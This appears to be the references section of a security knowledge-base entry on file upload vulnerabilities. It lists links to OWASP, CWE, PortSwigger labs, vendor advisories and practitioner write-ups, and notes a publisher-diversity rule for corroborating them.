## Related Bug Classes

Not yet researched.

## References

- **cheatsheetseries.owasp.org** (cheatsheet)
  - <https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html>
- **cwe.mitre.org** (taxonomy)
  - <https://cwe.mitre.org/data/definitions/434.html>
- **docs.python.org** (writeup)
  - <https://docs.python.org/3/library/tempfile.html>
- **helpnetsecurity.com** (writeup)
  - <https://www.helpnetsecurity.com/2026/02/02/pompelmi-open-source-secure-file-upload-scanning-node-js/>
- **kathan19.gitbook.io** (reference)
  - <https://kathan19.gitbook.io/howtohunt/file-upload-bypass/file_upload.md>
- **nccgroup.com** (research)
  - <https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/>
- **nginx.org** (writeup)
  - <https://nginx.org/en/docs/http/ngx_http_core_module.html>
- **php.net** (writeup)
  - <https://www.php.net/manual/en/features.file-upload.php>
- **portswigger.net** (primary)
  - <https://portswigger.net/kb/issues/00500980_file-upload-functionality>
  - <https://portswigger.net/web-security/file-upload>
  - <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass>
  - <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass>
- **raw.githubusercontent.com** (writeup)
  - <https://raw.githubusercontent.com/Esther7171/HackTheBox-Writeups-Walkthroughs/main/Write-ups/Academy/05.%20Web%20Exploitation/31c.%20File%20Upload%20Attacks/File%20Upload%20Attacks.md>
- **secra.es** (practitioner)
  - <https://secra.es/en/blog/file-upload-vulnerability-webshell-rce>
- **snyk.io** (writeup)
  - <https://snyk.io/blog/exploring-3-types-of-directory-traversal-vulnerabilities-in-c-c/>
- **talosintelligence.com** (vendor_advisory)
  - <https://www.talosintelligence.com/vulnerability_reports/TALOS-2023-1885>
- **zetsu.ninja** (practitioner)
  - <https://zetsu.ninja/book/portswigger/file-upload/>

Every item above is gated on >= 2 distinct publisher hosts (`wks/quality.py`, rule R1). Publisher diversity, not citation count, is what makes these corroborated.
